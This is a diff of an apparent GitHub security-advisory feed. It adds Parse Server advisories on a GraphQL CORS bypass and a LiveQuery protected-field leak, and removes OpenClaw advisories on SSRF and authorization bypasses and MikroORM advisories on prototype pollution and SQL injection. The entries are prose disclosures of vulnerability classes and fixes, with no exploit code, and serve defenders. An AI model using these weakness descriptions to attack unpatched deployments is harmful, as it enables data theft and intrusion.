+<li><a href="https://github.com/advisories/GHSA-3298-56p6-rpw2">https://github.com/advisories/GHSA-3298-56p6-rpw2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3298-56p6-rpw2</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-30T18:30:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] GraphQL API endpoint ignores CORS origin restriction]]></title>
+        <id>https://github.com/advisories/GHSA-q3p6-g7c4-829c</id>
+        <link href="https://github.com/advisories/GHSA-q3p6-g7c4-829c"/>
+        <updated>2026-03-30T18:05:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The GraphQL API endpoint does not respect the <code>allowOrigin</code> server option and unconditionally allows cross-origin requests from any website. This bypasses origin restrictions that operators configure to control which websites can interact with the Parse Server API. The REST API correctly enforces the configured <code>allowOrigin</code> restriction.</p>
+<h3 id="patches">Patches</h3>
+<p>The GraphQL API endpoint now uses the same CORS middleware as the REST API, ensuring the <code>allowOrigin</code> and <code>allowHeaders</code> server options are consistently enforced across all endpoints.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no known workaround other than upgrading.</p>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c">https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c</a></li>
+<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/pull/10334">https://github.com/parse-community/parse-server/pull/10334</a></li>
+<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/pull/10335">https://github.com/parse-community/parse-server/pull/10335</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c">https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10334">https://github.com/parse-community/parse-server/pull/10334</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10335">https://github.com/parse-community/parse-server/pull/10335</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/0347641507891d0013ec57f7c10f012064f41263">https://github.com/parse-community/parse-server/commit/0347641507891d0013ec57f7c10f012064f41263</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/4dd0d3d8be1c39664c74ad10bb0abaa76bc41203">https://github.com/parse-community/parse-server/commit/4dd0d3d8be1c39664c74ad10bb0abaa76bc41203</a></li>
+<li><a href="https://github.com/advisories/GHSA-q3p6-g7c4-829c">https://github.com/advisories/GHSA-q3p6-g7c4-829c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q3p6-g7c4-829c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-30T18:05:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] GraphQL API endpoint ignores CORS origin restriction]]></title>
+        <id>https://github.com/advisories/GHSA-q3p6-g7c4-829c</id>
+        <link href="https://github.com/advisories/GHSA-q3p6-g7c4-829c"/>
+        <updated>2026-03-30T18:05:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The GraphQL API endpoint does not respect the <code>allowOrigin</code> server option and unconditionally allows cross-origin requests from any website. This bypasses origin restrictions that operators configure to control which websites can interact with the Parse Server API. The REST API correctly enforces the configured <code>allowOrigin</code> restriction.</p>
+<h3 id="patches">Patches</h3>
+<p>The GraphQL API endpoint now uses the same CORS middleware as the REST API, ensuring the <code>allowOrigin</code> and <code>allowHeaders</code> server options are consistently enforced across all endpoints.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no known workaround other than upgrading.</p>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c">https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c</a></li>
+<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/pull/10334">https://github.com/parse-community/parse-server/pull/10334</a></li>
+<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/pull/10335">https://github.com/parse-community/parse-server/pull/10335</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c">https://github.com/parse-community/parse-server/security/advisories/GHSA-q3p6-g7c4-829c</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10334">https://github.com/parse-community/parse-server/pull/10334</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10335">https://github.com/parse-community/parse-server/pull/10335</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/0347641507891d0013ec57f7c10f012064f41263">https://github.com/parse-community/parse-server/commit/0347641507891d0013ec57f7c10f012064f41263</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/4dd0d3d8be1c39664c74ad10bb0abaa76bc41203">https://github.com/parse-community/parse-server/commit/4dd0d3d8be1c39664c74ad10bb0abaa76bc41203</a></li>
+<li><a href="https://github.com/advisories/GHSA-q3p6-g7c4-829c">https://github.com/advisories/GHSA-q3p6-g7c4-829c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q3p6-g7c4-829c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-30T18:05:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] LiveQuery protected field leak via shared mutable state across concurrent subscribers]]></title>
+        <id>https://github.com/advisories/GHSA-m983-v2ff-wq65</id>
+        <link href="https://github.com/advisories/GHSA-m983-v2ff-wq65"/>
+        <updated>2026-03-30T17:41:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>When multiple clients subscribe to the same class via LiveQuery, the event handlers process each subscriber concurrently using shared mutable objects. The sensitive data filter modifies these shared objects in-place, so when one subscriber's filter removes a protected field, subsequent subscribers may receive the already-filtered object. This can cause protected fields and authentication data to leak to clients that should not see them, or cause clients that should see the data to receive an incomplete object.</p>
+<p>Additionally, when an afterEvent Cloud Code trigger is registered, one subscriber's trigger modifications can leak to other subscribers through the same shared mutable state.</p>
+<p>Any Parse Server deployment using LiveQuery with protected fields or afterEvent triggers is affected when multiple clients subscribe to the same class.</p>
+<h3 id="patches">Patches</h3>
+<p>The fix deep-clones the shared objects at the start of each subscriber's processing callback, ensuring each subscriber works on an independent copy. Additionally, a bug was fixed where master key LiveQuery clients could not receive events on classes with protected fields due to an incorrect type passed to the sensitive data filter.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no known workaround.</p>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65">https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65</a></li>
+<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/pull/10330">https://github.com/parse-community/parse-server/pull/10330</a></li>
+<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/pull/10331">https://github.com/parse-community/parse-server/pull/10331</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65">https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10330">https://github.com/parse-community/parse-server/pull/10330</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10331">https://github.com/parse-community/parse-server/pull/10331</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/5834e29234593addaa0251a85f572ad4f376320b">https://github.com/parse-community/parse-server/commit/5834e29234593addaa0251a85f572ad4f376320b</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/776c71c3078e77d38c94937f463741793609d055">https://github.com/parse-community/parse-server/commit/776c71c3078e77d38c94937f463741793609d055</a></li>
+<li><a href="https://github.com/advisories/GHSA-m983-v2ff-wq65">https://github.com/advisories/GHSA-m983-v2ff-wq65</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m983-v2ff-wq65</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-30T17:40:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] LiveQuery protected field leak via shared mutable state across concurrent subscribers]]></title>
+        <id>https://github.com/advisories/GHSA-m983-v2ff-wq65</id>
+        <link href="https://github.com/advisories/GHSA-m983-v2ff-wq65"/>
+        <updated>2026-03-30T17:41:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>When multiple clients subscribe to the same class via LiveQuery, the event handlers process each subscriber concurrently using shared mutable objects. The sensitive data filter modifies these shared objects in-place, so when one subscriber's filter removes a protected field, subsequent subscribers may receive the already-filtered object. This can cause protected fields and authentication data to leak to clients that should not see them, or cause clients that should see the data to receive an incomplete object.</p>
+<p>Additionally, when an afterEvent Cloud Code trigger is registered, one subscriber's trigger modifications can leak to other subscribers through the same shared mutable state.</p>
+<p>Any Parse Server deployment using LiveQuery with protected fields or afterEvent triggers is affected when multiple clients subscribe to the same class.</p>
+<h3 id="patches">Patches</h3>
+<p>The fix deep-clones the shared objects at the start of each subscriber's processing callback, ensuring each subscriber works on an independent copy. Additionally, a bug was fixed where master key LiveQuery clients could not receive events on classes with protected fields due to an incorrect type passed to the sensitive data filter.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no known workaround.</p>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65">https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65</a></li>
+<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/pull/10330">https://github.com/parse-community/parse-server/pull/10330</a></li>
+<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/pull/10331">https://github.com/parse-community/parse-server/pull/10331</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65">https://github.com/parse-community/parse-server/security/advisories/GHSA-m983-v2ff-wq65</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10330">https://github.com/parse-community/parse-server/pull/10330</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10331">https://github.com/parse-community/parse-server/pull/10331</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/5834e29234593addaa0251a85f572ad4f376320b">https://github.com/parse-community/parse-server/commit/5834e29234593addaa0251a85f572ad4f376320b</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/776c71c3078e77d38c94937f463741793609d055">https://github.com/parse-community/parse-server/commit/776c71c3078e77d38c94937f463741793609d055</a></li>
+<li><a href="https://github.com/advisories/GHSA-m983-v2ff-wq65">https://github.com/advisories/GHSA-m983-v2ff-wq65</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m983-v2ff-wq65</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-30T17:40:59.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@nocobase/plugin-workflow-javascript] NocoBase Affected by Sandbox Escape to RCE via console._stdout Prototype Chain Traversal in Workflow Script Node]]></title>
         <id>https://github.com/advisories/GHSA-px3p-vgh9-m57c</id>
@@ -551,231 +1244,5 @@ Content-Type: application/json</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-29T15:48:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: SSRF via Unguarded Configured Base URLs in Multiple Channel Extensions (Incomplete Fix for CVE-2026-28476)]]></title>
-        <id>https://github.com/advisories/GHSA-rhfg-j8jq-7v2h</id>
-        <link href="https://github.com/advisories/GHSA-rhfg-j8jq-7v2h"/>
-        <updated>2026-03-29T15:48:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>SSRF via Unguarded Configured Base URLs in Multiple Channel Extensions (Incomplete Fix for CVE-2026-28476)</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code></li>
-<li>Affected versions: <code>&lt;= 2026.3.24</code></li>
-<li>First patched version: <code>2026.3.25</code></li>
-<li>Latest published npm version at verification time: <code>2026.3.24</code></li>
-</ul>
-<h2 id="details">Details</h2>
-<p>Several channel extensions still used raw <code>fetch()</code> against configured base URLs without the SSRF guard that was added for CVE-2026-28476. Commit <code>f92c92515bd439a71bd03eb1bc969c1964f17acf</code> routes those outbound requests through <code>fetchWithSsrFGuard</code> so configured endpoints cannot be rebound to blocked internal destinations.</p>
-<p>Verified vulnerable on tag <code>v2026.3.24</code> and fixed on <code>main</code> by commit <code>f92c92515bd439a71bd03eb1bc969c1964f17acf</code>.</p>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>f92c92515bd439a71bd03eb1bc969c1964f17acf</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rhfg-j8jq-7v2h">https://github.com/openclaw/openclaw/security/advisories/GHSA-rhfg-j8jq-7v2h</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/f92c92515bd439a71bd03eb1bc969c1964f17acf">https://github.com/openclaw/openclaw/commit/f92c92515bd439a71bd03eb1bc969c1964f17acf</a></li>
-<li><a href="https://github.com/advisories/GHSA-pg2v-8xwh-qhcc">https://github.com/advisories/GHSA-pg2v-8xwh-qhcc</a></li>
-<li><a href="https://github.com/advisories/GHSA-rhfg-j8jq-7v2h">https://github.com/advisories/GHSA-rhfg-j8jq-7v2h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rhfg-j8jq-7v2h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-29T15:48:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Google Chat Authz Bypass via Group Policy Rebinding with Mutable Space displayName]]></title>
-        <id>https://github.com/advisories/GHSA-52q4-3xjc-6778</id>
-        <link href="https://github.com/advisories/GHSA-52q4-3xjc-6778"/>
-        <updated>2026-03-29T15:48:16.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Google Chat Authz Bypass via Group Policy Rebinding with Mutable Space displayName</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code></li>
-<li>Affected versions: <code>&lt;= 2026.3.24</code></li>
-<li>First patched version: <code>2026.3.25</code></li>
-<li>Latest published npm version at verification time: <code>2026.3.24</code></li>
-</ul>
-<h2 id="details">Details</h2>
-<p>Google Chat group authorization previously relied on mutable space display names, which allowed policy rebinding when names changed or collided. Commit <code>11ea1f67863d88b6cbcb229dd368a45e07094bff</code> requires stable group IDs for access decisions.</p>
-<p>Verified vulnerable on tag <code>v2026.3.24</code> and fixed on <code>main</code> by commit <code>11ea1f67863d88b6cbcb229dd368a45e07094bff</code>.</p>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>11ea1f67863d88b6cbcb229dd368a45e07094bff</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-52q4-3xjc-6778">https://github.com/openclaw/openclaw/security/advisories/GHSA-52q4-3xjc-6778</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/11ea1f67863d88b6cbcb229dd368a45e07094bff">https://github.com/openclaw/openclaw/commit/11ea1f67863d88b6cbcb229dd368a45e07094bff</a></li>
-<li><a href="https://github.com/advisories/GHSA-52q4-3xjc-6778">https://github.com/advisories/GHSA-52q4-3xjc-6778</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-52q4-3xjc-6778</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-29T15:48:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: `session_status` sessionId resolution bypasses sandboxed session-tree visibility]]></title>
-        <id>https://github.com/advisories/GHSA-q2qc-744p-66r2</id>
-        <link href="https://github.com/advisories/GHSA-q2qc-744p-66r2"/>
-        <updated>2026-03-29T15:47:51.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>session_status</code> sessionId resolution bypasses sandboxed session-tree visibility</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code></li>
-<li>Affected versions: <code>&gt;= 2026.3.11, &lt;= 2026.3.24</code></li>
-<li>First patched version: <code>2026.3.25</code></li>
-<li>Latest published npm version at verification time: <code>2026.3.24</code></li>
-</ul>
-<h2 id="details">Details</h2>
-<p><code>session_status</code> previously resolved a <code>sessionId</code> to a canonical session key after early visibility checks, letting sandboxed children reach parent or sibling sessions that were blocked by explicit <code>sessionKey</code>. Commit <code>d9810811b6c3c9266d7580f00574e5e02f7663de</code> enforces visibility after <code>sessionId</code> resolution so sandboxed callers cannot escape their session tree.</p>
-<p>Verified vulnerable on tag <code>v2026.3.24</code> and fixed on <code>main</code> by commit <code>d9810811b6c3c9266d7580f00574e5e02f7663de</code>.</p>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>d9810811b6c3c9266d7580f00574e5e02f7663de</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-q2qc-744p-66r2">https://github.com/openclaw/openclaw/security/advisories/GHSA-q2qc-744p-66r2</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/d9810811b6c3c9266d7580f00574e5e02f7663de">https://github.com/openclaw/openclaw/commit/d9810811b6c3c9266d7580f00574e5e02f7663de</a></li>
-<li><a href="https://github.com/advisories/GHSA-q2qc-744p-66r2">https://github.com/advisories/GHSA-q2qc-744p-66r2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q2qc-744p-66r2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-29T15:47:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Gateway HTTP Session History Route Bypasses Operator Read Scope]]></title>
-        <id>https://github.com/advisories/GHSA-5jvj-hxmh-6h6j</id>
-        <link href="https://github.com/advisories/GHSA-5jvj-hxmh-6h6j"/>
-        <updated>2026-03-29T15:46:41.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Gateway HTTP Session History Route Bypasses Operator Read Scope</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code></li>
-<li>Affected versions: <code>&lt;= 2026.3.24</code></li>
-<li>First patched version: <code>2026.3.25</code></li>
-<li>Latest published npm version at verification time: <code>2026.3.24</code></li>
-</ul>
-<h2 id="details">Details</h2>
-<p>The HTTP <code>/sessions/:sessionKey/history</code> route previously authenticated bearer tokens but skipped the same <code>operator.read</code> check used by <code>chat.history</code> over WebSocket. Commit <code>1c45123231516fa50f8cf8522ba5ff2fb2ca7aea</code> makes HTTP callers declare operator scopes and rejects history reads that do not include <code>operator.read</code>.</p>
-<p>Verified vulnerable on tag <code>v2026.3.24</code> and fixed on <code>main</code> by commit <code>1c45123231516fa50f8cf8522ba5ff2fb2ca7aea</code>.</p>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>1c45123231516fa50f8cf8522ba5ff2fb2ca7aea</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-5jvj-hxmh-6h6j">https://github.com/openclaw/openclaw/security/advisories/GHSA-5jvj-hxmh-6h6j</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/1c45123231516fa50f8cf8522ba5ff2fb2ca7aea">https://github.com/openclaw/openclaw/commit/1c45123231516fa50f8cf8522ba5ff2fb2ca7aea</a></li>
-<li><a href="https://github.com/advisories/GHSA-5jvj-hxmh-6h6j">https://github.com/advisories/GHSA-5jvj-hxmh-6h6j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5jvj-hxmh-6h6j</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-29T15:46:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mikro-orm/core] MikroORM has Prototype Pollution in Utils.merge]]></title>
-        <id>https://github.com/advisories/GHSA-qpfv-44f3-qqx6</id>
-        <link href="https://github.com/advisories/GHSA-qpfv-44f3-qqx6"/>
-        <updated>2026-03-29T15:44:16.000Z</updated>
-        <content type="html"><![CDATA[<p>A prototype pollution vulnerability exists in the <code>Utils.merge</code> helper used internally by MikroORM when merging object structures.</p>
-<p>The function did not prevent special keys such as <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code>, allowing attacker-controlled input to modify the JavaScript object prototype when merged.</p>
-<p>Exploitation requires application code to pass untrusted user input into ORM operations that merge object structures, such as entity property assignment or query condition construction.</p>
-<p>Prototype pollution may lead to denial of service or unexpected application behavior. In certain scenarios, polluted properties may influence query construction and potentially result in SQL injection depending on application code.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mikro-orm/mikro-orm/security/advisories/GHSA-qpfv-44f3-qqx6">https://github.com/mikro-orm/mikro-orm/security/advisories/GHSA-qpfv-44f3-qqx6</a></li>
-<li><a href="https://github.com/advisories/GHSA-qpfv-44f3-qqx6">https://github.com/advisories/GHSA-qpfv-44f3-qqx6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qpfv-44f3-qqx6</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-29T15:44:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mikro-orm/core] MikroORM has Prototype Pollution in Utils.merge]]></title>
-        <id>https://github.com/advisories/GHSA-qpfv-44f3-qqx6</id>
-        <link href="https://github.com/advisories/GHSA-qpfv-44f3-qqx6"/>
-        <updated>2026-03-29T15:44:16.000Z</updated>
-        <content type="html"><![CDATA[<p>A prototype pollution vulnerability exists in the <code>Utils.merge</code> helper used internally by MikroORM when merging object structures.</p>
-<p>The function did not prevent special keys such as <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code>, allowing attacker-controlled input to modify the JavaScript object prototype when merged.</p>
-<p>Exploitation requires application code to pass untrusted user input into ORM operations that merge object structures, such as entity property assignment or query condition construction.</p>
-<p>Prototype pollution may lead to denial of service or unexpected application behavior. In certain scenarios, polluted properties may influence query construction and potentially result in SQL injection depending on application code.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mikro-orm/mikro-orm/security/advisories/GHSA-qpfv-44f3-qqx6">https://github.com/mikro-orm/mikro-orm/security/advisories/GHSA-qpfv-44f3-qqx6</a></li>
-<li><a href="https://github.com/advisories/GHSA-qpfv-44f3-qqx6">https://github.com/advisories/GHSA-qpfv-44f3-qqx6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qpfv-44f3-qqx6</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-29T15:44:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mikro-orm/core] MikroORM is vulnerable to SQL Injection via specially crafted object]]></title>
-        <id>https://github.com/advisories/GHSA-gwhv-j974-6fxm</id>
-        <link href="https://github.com/advisories/GHSA-gwhv-j974-6fxm"/>
-        <updated>2026-03-29T15:44:05.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>MikroORM versions &lt;= 6.6.9 and &lt;= 7.0.5 are vulnerable to SQL injection when specially crafted objects are interpreted as raw SQL query fragments.</p>
-<h2 id="impact">Impact</h2>
-<p>If user-controlled input is passed directly to MikroORM query construction APIs, an attacker may inject raw SQL fragments. This can lead to SQL injection depending on the database and query being executed.</p>
-<h2 id="affected-usage">Affected usage</h2>
-<p>The issue occurs when untrusted objects are passed to ORM write APIs such as:</p>
-<ul>
-<li><code>wrap(entity).assign(userInput)</code> followed by <code>em.flush()</code></li>
-<li><code>em.nativeUpdate()</code></li>
-<li><code>em.nativeInsert()</code></li>
-<li><code>em.create()</code> followed by <code>em.flush()</code></li>
-</ul>
-<p>Applications that validate input types or enforce strict schema validation before passing data to MikroORM are not affected.</p>
-<h2 id="fix">Fix</h2>
-<p>The vulnerability was caused by duck-typed detection of internal ORM marker properties.</p>
-<p>The fix replaces these checks with symbol-based markers that cannot be reproduced by user input.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mikro-orm/mikro-orm/security/advisories/GHSA-gwhv-j974-6fxm">https://github.com/mikro-orm/mikro-orm/security/advisories/GHSA-gwhv-j974-6fxm</a></li>
-<li><a href="https://github.com/advisories/GHSA-gwhv-j974-6fxm">https://github.com/advisories/GHSA-gwhv-j974-6fxm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gwhv-j974-6fxm</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-03-29T15:44:04.000Z</published>
     </entry>
 </feed>
